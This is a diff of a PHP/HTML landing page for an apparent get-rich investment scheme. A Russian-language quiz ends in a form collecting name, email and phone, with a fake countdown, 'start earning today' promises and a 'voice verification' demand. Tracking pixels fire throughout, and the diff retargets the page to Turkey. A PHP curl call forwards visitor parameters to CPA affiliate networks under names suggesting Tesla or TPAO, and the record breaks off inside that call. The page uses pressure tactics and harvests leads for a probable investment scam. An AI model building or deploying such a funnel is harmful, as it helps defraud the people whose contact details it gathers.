-                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
-                                    </div>
-                                    <p class="card__checkbox-text">от 10.000€</p>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <input class="visually-hidden" type="radio" name="investment" value="4">
-                                    <div class="money__wraper">
-                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
-                                    </div>
-                                    <p class="card__checkbox-text">от 30.000€</p>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-                    <section class="card card-five hidden">
-                        <div class="card-wrapper card-five__wrapper">
-                            <h1 class="card__title">
-                                Сколько времени вы готовы тратить на инвестирование?
-                            </h1>
-                            <div class="card__checkbox">
-                                <div class="card__checkbox-wrapper border">
-                                    <input class="visually-hidden" type="radio" name="investment" value="1" checked="">
-                                    <img class="card__img" src="img/card5_1.webp" width="50" height="43" alt="">
-                                    <p class="card__checkbox-text">1 час<br>каждый день</p>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <input class="visually-hidden" type="radio" name="investment" value="2">
-                                    <img class="card__img card-five__img" src="img/card5_2.webp" width="50" height="38" alt="">
-                                    <p class="card__checkbox-text">2 часа<br>раз в неделю</p>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-                    <section class="card card-six hidden">
-                        <div class="card-wrapper card-six__wrapper">
-                            <h1 class="card__title">
-                                Поздравляем!
-                                Вы за шаг до успеха, оставьте свои контактные данные и начините зарабатывать уже сегодня!
-                            </h1>
-                            <form class="form" action="api.php?<?=http_build_query($_GET);?>" method="post"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=htmlspecialchars($_GET["uuid"]);?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=htmlspecialchars($_GET["fbclid"]);?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=htmlspecialchars($_GET["gclid"]);?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=htmlspecialchars($_GET["cpc"]);?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=htmlspecialchars($_GET["cur"]);?>" /><?php endif; ?>                                <div class="form__wrapper">
-                                    <label class="form__label" for="name">Ваше имя</label>
-                                    <input class="form__input" id="name" type="text" name="forename" placeholder="Имя" required>
-                                </div>
-                                <div class="form__wrapper">
-                                    <label class="form__label" for="last">Ваша фамилия</label>
-                                    <input class="form__input" id="surname" type="text" name="surname" placeholder="Фамилия" required>
-                                </div>
-                                <div class="form__wrapper">
-                                    <label class="form__label" for="email">Ваш e-mail</label>
-                                    <input class="form__input" id="email" type="email" name="email" placeholder="Email" required>
-                                </div>
-                                <div class="form__wrapper">
-                                    <label class="form__label" for="phone">Ваш номер телефона</label>
-                                    <input class="form__input phone" id="phone" type="tel" name="phone" required>
-                                </div>
-                                <div class="form__attention">
-                                    <p class="attention__title">
-                                        Для участия в программе нужна голосовая верификация, убедитесь что указали правильный номер телефона.
-                                    </p>
-                                </div>
-                                <button class="buttons" type="submit" name="submit">
-                                    Начать зарабатывать
-                                </button>
-                                <input type="hidden" name="countryDialCode" value="+7"/>
-                                <input type="hidden" name="country" value="ru"/>
-                                <input type="hidden" name="comment" value="" />
-                            </form>
-                        </div>
-                    </section>
-                    <button data-slide="0" id="button_next" class="button" type="button">
-                        Далее
-                    </button>
-                </div>
-            </main>
-            <div class="footer bb hidden">
-                <div class="time-text">Осталось времени:</div>
-                <div class="timer-wrap">
-                    <div class="timer-new">
-                        <div class="timer__index">
-                            <span id="min" class="timer__item minutes time">3</span>
-                        </div>
-                        <div class="timer__point"></div>
-                        <div class="timer__index">
-                            <span id="sec" class="timer__item minutes time">00</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-    <input type="hidden" name="onlyCountries" value="ru"/>
+    </div>
+    <input type="hidden" name="onlyCountries" value="tr"/>
     <input type="hidden" name="allowDropdown" value="false"/>
     <script type="text/javascript" src="assets/landing/js/jquery.min.js"></script>
     <script type="text/javascript" src="assets/landing/js/jquery.validate.min.js"></script>
-    <script type="text/javascript" src="assets/landing/js/jquery.mask.min.js"></script>
-    <script type="text/javascript" src="assets/landing/js/intlTelInput.js"></script>
     <script type="text/javascript" src="assets/landing/js/form.js"></script>
-    <script src="js/main.js" type="text/javascript"></script>
-    <?php
-$pixl = array (
-  'fb' => '',
-  'fbe' => 'Lead',
-  'ga' => '',
-  'gad' => '',
-  'tt' => '',
-  'vk' => '',
-  'mt' => '',
-  'mtrk' => '',
-);
-$isbad = isset($_GET['id']) && substr( $_GET['id'], 0, 1 ) == '0';
-if ( isset($_GET['status']) && $_GET['status'] == 'error' ) $isbad = true;
-foreach ( $pixl as $px => $df ) if ( $isbad ) {
-	$$px = false;
-} elseif (isset( $_GET[$px] )) {
-	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
-} elseif (isset( $_COOKIE[$px] )) {
-	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_COOKIE[$px], FILTER_SANITIZE_STRING )) );
-} else $$px = $df;
-if ( $fb ) {
-	$fb = explode( ',', $fb );
-	?><script>!function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js'); <?php
-	foreach ( $fb as $f ) if ( $f = trim($f) ) :
-	?> fbq('init', '<?=$f;?>'); <?php
-	endif;
-	?> fbq('track', 'PageView'); setTimeout( fbq, 30000, 'track', 'ViewContent' );</script><noscript><?php
-	foreach ( $fb as $f ) if ( $f = trim($f) ) :
-	?><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?=$f;?>&ev=PageView&noscript=1" /><?php
-	endif;
-	?></noscript><?php
-}
-if ( $ga ) {
-	$gtm = ( strtolower(substr( $ga, 0, 3 )) == 'gtm' ) ? 1 : 0;
-	if ( $gtm ) {
-		?><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','<?=$ga;?>');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=<?=$ga;?>" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><?php
-	} else {
-		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>');</script><?php
-	}
-}
-if ( $tt ) {
-	?><script> !function (w, d, t) {  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)}; ttq.load('<?=$tt;?>'); ttq.page(); }(window, document, 'ttq'); </script><?php
-}
-if ( $vk ) {
-	?><script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src='https://vk.com/js/api/openapi.js?169',t.onload=function(){VK.Retargeting.Init("<?=$vk;?>"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=<?=$vk;?>" style="position:fixed; left:-999px;" alt=""/></noscript><?php
-}
-if ( $mt ) {
-	?><script type="text/javascript"> var _tmr = window._tmr || (window._tmr = []); _tmr.push({id: "<?=$mt;?>", type: "pageView", start: (new Date()).getTime(), pid: "USER_ID"}); (function (d, w, id) { if (d.getElementById(id)) return; var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id; ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js"; var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);}; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "topmailru-code");</script><noscript><div><img src="//top-fwz1.mail.ru/counter?id=<?=$mt;?>;js=na" style="border:0;position:absolute;left:-9999px;" alt="" /></div></noscript><?php
-}
-if ( $mtrk ) {
-	?><script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(<?=$mtrk;?>, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script><noscript><div><img src="https://mc.yandex.ru/watch/<?=$mtrk;?>" style="position:absolute; left:-9999px;" alt="" /></div></noscript><?php
-}
-?></body>
+    <script>
+    $(".policy").click(function() {
+        $("#popup").removeClass("hide");
+    });
+    $("#close").click(function() {
+        $("#popup").toggleClass("hide");
+    });
+    </script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var popups = document.querySelectorAll('.popup');
+
+        popups.forEach(function(popup) {
+            popup.addEventListener('click', function(event) {
+                if (event.target === this) {
+                    this.classList.add('hide');
+                }
+            });
+        });
+    });
+
+
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const slides = document.querySelectorAll('.slide');
+
+        function showNextSlide(currentSlide) {
+            const currentIndex = Array.from(slides).indexOf(currentSlide);
+            if (currentIndex < slides.length - 1) {
+                const nextSlide = slides[currentIndex + 1];
+                currentSlide.classList.add('hide');
+                nextSlide.classList.remove('hide');
+            }
+        }
+
+        slides.forEach(slide => {
+            const slideBtns = slide.querySelectorAll('.slide__btn, .slide__group');
+            slideBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    showNextSlide(slide);
+                });
+            });
+        });
+    });
+    </script>
+<!--[FOOTER]--></body>
 
 </html><?php
-$curl = curl_init( "https://r.1xcpa.net/teslax-new/signin4/?flow=486&only=code&" . http_build_query($_GET) );
+$curl = curl_init( "https://dozaclick.com/tpao/tr/signin7/?flow=3326&only=code&" . http_build_query($_GET) );
 curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
 curl_setopt( $curl, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"] );
 curl_setopt( $curl, CURLOPT_HTTPHEADER, [
